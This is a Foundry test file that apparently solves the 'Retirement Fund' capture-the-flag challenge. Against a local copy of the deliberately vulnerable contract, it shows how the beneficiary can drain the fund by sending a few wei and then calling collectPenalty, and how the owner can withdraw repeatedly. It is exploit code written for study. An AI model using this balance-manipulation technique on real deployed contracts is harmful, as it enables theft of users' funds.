// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {RetirementFundChallenge} from "../../src/retirement/RetirementFundChallenge.sol";

contract RetirementFundChallengeAttackTest is Test {
    RetirementFundChallenge public retirementFund;
    
    address constant OWNER = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    address constant BENEFICIARY = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

    function setUp() public {
        vm.deal(OWNER, 1 ether);  
        vm.prank(OWNER);
        retirementFund = new RetirementFundChallenge{ value: 1 ether }(BENEFICIARY);
    }

    function testAttackFromBeneficiary() public {
        vm.deal(BENEFICIARY, 100 wei);  

        console.log("Before Attack:");      
        console.log("Beneficiary balance: ", BENEFICIARY.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance);            
        
        // beneficiary add funds to prepate the attack
        vm.prank(BENEFICIARY);
        (bool ok,) = payable(address(retirementFund)).call{ value: 10 wei }("");
        assertTrue(ok, "Falha ao enviar ETH");        
        assertEq(address(retirementFund).balance, 1 ether + 10 wei );
        assertEq(address(BENEFICIARY).balance, 90 wei );

        // beneficiary drain the funds
        vm.prank(BENEFICIARY);
        retirementFund.collectPenalty();
        assertEq(address(retirementFund).balance, 0);
        assertEq(BENEFICIARY.balance, 1 ether + 100 wei );

        console.log("");
        console.log("After Attack:");      
        console.log("Beneficiary balance: ", BENEFICIARY.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance);      
    }

    function testAttackFromOwner() public {
        console.log("Before Attack:");      
        console.log("Owner balance: ", OWNER.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance); 

        vm.prank(OWNER);
        retirementFund.withdraw();

        assertEq(900000000000000000, OWNER.balance);
        assertEq(100000000000000000, address(retirementFund).balance);

        vm.prank(OWNER);
        retirementFund.withdraw();

        assertEq(990000000000000000, OWNER.balance);
        assertEq(10000000000000000, address(retirementFund).balance);

        console.log("After Attack:");      
        console.log("Owner balance: ", OWNER.balance);      
        console.log("Retirement balance: ", address(retirementFund).balance); 
    }
}
